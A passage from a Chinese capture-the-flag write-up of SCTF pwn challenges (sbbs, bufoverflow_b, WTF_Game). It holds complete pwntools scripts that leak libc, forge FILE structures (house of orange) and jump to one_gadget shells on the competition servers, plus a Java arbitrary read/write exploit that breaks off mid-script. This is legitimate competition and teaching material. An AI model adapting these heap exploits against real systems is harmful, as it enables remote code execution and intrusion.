<p>然后之后就常规house of orange了</p>
<p>下面是payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	<span class="comment">#p=process('./sbbs')</span></span><br><span class="line">	p=process(<span class="string">'./sbbs'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">	context.log_level=<span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'116.62.142.216'</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(sz,content)</span>:</span></span><br><span class="line">	se(<span class="string">'1\n'</span>)</span><br><span class="line">	ru(<span class="string">'Pls Input your note size'</span>)</span><br><span class="line">	se(str(sz)+<span class="string">'\n'</span>)</span><br><span class="line">	ru(<span class="string">'Input your note'</span>)</span><br><span class="line">	se(content)</span><br><span class="line">	ru(<span class="string">'your note is\n'</span>)</span><br><span class="line">	data=ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">	ru(<span class="string">'4.exit'</span>)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	se(<span class="string">'2\n'</span>)</span><br><span class="line">	ru(<span class="string">'Input id:'</span>)</span><br><span class="line">	se(str(idx)+<span class="string">'\n'</span>)</span><br><span class="line">	ru(<span class="string">'4.exit'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(name,ty)</span>:</span></span><br><span class="line">	se(<span class="string">'3\n'</span>)</span><br><span class="line">	ru(<span class="string">'Please input your name'</span>)</span><br><span class="line">	se(name)</span><br><span class="line">	ru(<span class="string">'choice type'</span>)</span><br><span class="line">	se(str(ty)+<span class="string">'\n'</span>)</span><br><span class="line">	ru(<span class="string">'4.exit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----leak heap--------</span></span><br><span class="line">create(<span class="number">0x1488</span>,<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">data=create(<span class="number">0x108</span>,<span class="string">'a'</span>*<span class="number">17</span>+<span class="string">'\n'</span>)[<span class="number">16</span>:]</span><br><span class="line">heap=u64(data.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))<span class="number">-0x61</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#clear</span></span><br><span class="line">create(<span class="number">0x1378</span>,<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------use login------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x108</span>,<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0xe8</span>,(p64(<span class="number">0x60</span>)+p64(<span class="number">0x21</span>))*<span class="number">0xe</span>+<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="string">'\n'</span>)</span><br><span class="line">create(<span class="number">0x108</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">login(<span class="string">'a'</span>*<span class="number">8</span>+p64(heap+<span class="number">0x118</span><span class="number">-0xf</span>),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=u64(create(<span class="number">0x2e8</span>,<span class="string">'\n'</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">base=libc<span class="number">-0x3C4B78</span></span><br><span class="line"></span><br><span class="line">io_list_all_addr = base + e.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">jump_table_addr = base + e.symbols[<span class="string">'_IO_file_jumps'</span>] + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x2e8</span>,<span class="string">'a'</span>*<span class="number">0xe8</span>+p64(<span class="number">0x91</span>)+p64(<span class="number">0x21</span>)*<span class="number">30</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">	create(<span class="number">0x1408</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">file_struct=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(libc)+p64(io_list_all_addr - <span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">file_struct += p64(jump_table_addr)</span><br><span class="line">file_struct += p64(base + <span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x2e8</span>,<span class="string">'a'</span>*<span class="number">0xe0</span>+file_struct+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(<span class="string">'1\n250\n'</span>)</span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag:sctf{c4FRjmtQKQaRidxdOCjzB898A4fHb0rM}</code></p>
</blockquote>
<h2 id="bufoverflow-b"><a href="#bufoverflow-b" class="headerlink" title="bufoverflow_b"></a>bufoverflow_b</h2><p>新加了一个函数，可以控制地址写一个byte, 应该是可以通过这个这个改写当前堆指针<br>的末尾为0，然后就可以把它自己改成free_hook, 再来就可以修改 free_hook 了</p>
<p>貌似是这样，并没有进行尝试，自己用的应该算是非预期解吧。。</p>
<p>其他的部分和 bufferoverflow_a 都差不多，fill 的时候改了一点<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_str_E2D</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">"Read faild!\n"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> || !buf )  <span class="comment">//===========&gt; 这里 buf 读取直到遇到 null buye</span></span><br><span class="line">………………………………...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>前面 a 部署 fake chunk size 什么的 时候必定会存在 null byte</p>
<p>这样前面的 fill 的过程就会失效</p>
<p>但是还是可以通过 fill 来部署。。</p>
<p>具体这样</p>
<p>比如要搞一个 fake size 0x61</p>
<p>0x00 | 0x61<br>fd      |   bk </p>
<p>首先 fill 一下， size 的地方 传入 \x61<br>aaaaaaaa| \x61<br>fd         | bk<br> 然后重新 fill 一下， fill 的长度变短，像下面<br>aaaaaaa\x00|\x61</p>
<p>这样 \x61 就会遗留在 heap 上</p>
<p>其他的地址也可以类似的操作，不断的fill 之后就可以构造和 bufoverflow_a 一样的布局</p>
<p>那就简单了，改改 bufoverflow_a 的脚本就完事了, 脚本当时草草写的，并没有太考虑效率。。这样做缺点是需要有很多fill, 会花比较长时间。。w</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">file_addr=<span class="string">'./bufoverflow_b'</span></span><br><span class="line">libc_addr=<span class="string">'./libc.so.6'</span></span><br><span class="line">host=<span class="string">'116.62.152.176'</span></span><br><span class="line">port=<span class="number">20002</span></span><br><span class="line">    </span><br><span class="line">p=process(<span class="string">'./bufoverflow_b'</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv)==<span class="number">2</span>:</span><br><span class="line">    p=remote(host,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(op)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt;'</span>,str(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delsome</span><span class="params">(index)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'Index: '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(con)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_fill</span><span class="params">(payload,size)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">        fill(<span class="string">'a'</span>*(len(payload)-i)+payload[-i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># libc leak</span></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">show()</span><br><span class="line">leak=u64(p.recvline().strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_base=leak<span class="number">-0x88</span> -libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p.info(<span class="string">'leak '</span>+hex(leak))</span><br><span class="line">p.info(<span class="string">'libc_base '</span>+hex(libc_base))</span><br><span class="line"><span class="comment"># clear</span></span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line">delsome(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### overlap unsorted bin </span></span><br><span class="line">alloc(<span class="number">0x150</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x150</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x110</span></span><br><span class="line">payload+=p64(<span class="number">0x170</span>)+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(<span class="number">0x200</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">new_fill(payload,<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x160</span>)<span class="comment">#0</span></span><br><span class="line">delsome(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#1</span></span><br><span class="line">fill(<span class="string">'a'</span>*<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0xb0</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x160</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">delsome(<span class="number">2</span>)</span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0xf0</span>)<span class="comment">#0</span></span><br><span class="line">delsome(<span class="number">4</span>)</span><br><span class="line">alloc(<span class="number">0x290</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">io_list=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">vtable_addr=libc_base+libc.symbols[<span class="string">'_IO_file_jumps'</span>]+<span class="number">0xc0</span><span class="number">-0x480</span></span><br><span class="line">p.info(<span class="string">'vtable_addr '</span>+hex(vtable_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_struct=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(leak)+p64(io_list - <span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">file_struct += p64(vtable_addr)</span><br><span class="line">file_struct += p64(libc_base + <span class="number">0x3f38a</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'z'</span>*<span class="number">0x10</span> </span><br><span class="line">payload+=file_struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size=len(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----- ugly fill ---------------</span></span><br><span class="line"><span class="comment"># one _gadget</span></span><br><span class="line">fill(<span class="string">'z'</span>*(size<span class="number">-1</span>))</span><br><span class="line">fill(<span class="string">'z'</span>*(size<span class="number">-0x8</span>)+p64(libc_base +<span class="number">0x3f38a</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># vtable </span></span><br><span class="line">fill(<span class="string">'z'</span>*(size<span class="number">-0x8</span><span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">fill(<span class="string">'z'</span>*(size<span class="number">-0x10</span>)+p64(vtable_addr))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xd8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(size<span class="number">-0x11</span>-i)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p64(3)</span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x28</span>)+<span class="string">'\x03'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x28</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p64(2)</span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x20</span>)+<span class="string">'\x02'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x20</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io_list_all -0x10 </span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x18</span>)+p64(io_list<span class="number">-0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x18</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin addr</span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x10</span>)+p64(leak))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x10</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># size 0x61 </span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+<span class="string">'\x61'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p64(0)</span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger orange</span></span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line">exp_bp(<span class="string">'aaaaaaa'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag:SCTF{7here_@re_s0m3_3rr0rs_7hen_wh47_wi11_u_do}</code></p>
</blockquote>
<h2 id="WTF-Game"><a href="#WTF-Game" class="headerlink" title="WTF_Game"></a>WTF_Game</h2><p>看了一下java的代码，自带任意写和任意读<br>关键一个点就是，有了任意写和任意读，能干什么？</p>
<p>平时的pwn题的话随便来一波都可以get shell<br>但是在java环境下，这就很复杂了……</p>
<p>首先尝试了直接把flag给dump出来，但是弄了半天，好像怎样都dump不出来flag，放弃了</p>
<p>然后仔细看了下，发现Save那里会返回Player和boss在栈上的地址，然后boss的toString是可以读flag的</p>
<p>那样只要把player和boss交换一下，就可以拿到flag了</p>
<p>下面是payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p=process(<span class="string">''</span>)</span><br><span class="line">	<span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">	context.log_level=<span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	e=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.24.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'149.28.12.44'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr_data</span><span class="params">(addr)</span>:</span></span><br><span class="line">	se(<span class="string">'DebugSetDataStoreAddress #'</span>+str(addr))</span><br><span class="line">	ru(<span class="string">'&gt;'</span>)</span><br><span class="line">	se(<span class="string">'showinfo'</span>)</span><br><span class="line">	data=ru(<span class="string">'\n'</span>)</span><br><span class="line">	idx=data[<span class="number">1</span>:].index(<span class="string">'-'</span>)</span><br><span class="line">	t=<span class="number">0x100000000</span></span><br><span class="line">	d1=int(data[:idx+<span class="number">1</span>])</span><br><span class="line">	d2=int(data[idx+<span class="number">2</span>:])</span><br><span class="line">	d1=(d1+<span class="number">0x100000000</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">	d2=(d2+<span class="number">0x100000000</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">	ru(<span class="string">'&gt;'</span>)</span><br><span class="line">	<span class="keyword">return</span> p32(d1)+p32(d2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_data</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">	se(<span class="string">'DebugSetDataStoreAddress #'</span>+str(addr))</span><br><span class="line">	ru(<span class="string">'&gt;'</span>)</span><br><span class="line">	se(<span class="string">'SetHP #'</span>+str(data))</span><br><span class="line">	ru(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">se(<span class="string">'VeroFessIsHandsome'</span>)</span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">se(<span class="string">'DebugShowDataStoreAddress'</span>)</span><br><span class="line"></span><br><span class="line">addr=int(ru(<span 